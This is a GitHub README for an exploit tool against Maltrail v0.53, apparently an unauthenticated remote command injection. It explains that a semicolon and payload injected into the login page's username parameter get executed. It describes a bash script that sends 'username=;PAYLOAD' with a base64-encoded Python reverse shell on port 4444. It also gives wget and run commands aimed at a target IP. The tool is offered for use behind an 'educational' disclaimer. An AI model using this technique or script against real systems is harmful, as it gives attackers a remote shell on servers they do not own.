# Maltrail v0.53 RCE

> [!WARNING]  
> This is an educational project, I am not responsible for any use

# Exploit

In Maltrail's web service the username parameter of the login page does not sanitise, which allows an attacker to inject commands without being authenticated and from a remote machine.

In a shell we can separate command with a `;` and what comes before the `;` will be executed as one command and what comes after will be executed as another command, if you inject into the `username` parameter a `;` + a `payload` the `payload` will be executed because the source code uses `subprocess.check_output` to check the value of the `username` parameter.

# What is it and how does it work?

Maltrail is a malicious traffic detection system [to learn more visit the official website](https://github.com/stamparm/maltrail)

This bash script sends a request using `curl` to the server that hosts maltrail. That request contains the data from -> `username=;PAYLOAD` which where it says `PAYLOAD` will execute a reverse shell using base64 encoded python on port 4444.

# Usage

```zsh
wget https://raw.githubusercontent.com/Rubioo02/Maltrail-v0.53-RCE/main/exploit.sh
chmod +x exploit.sh
./exploit.sh -t <TARGET_IP> -i <LISTENING_IP>
```

# BLOG
<https://rubioo02.github.io/>
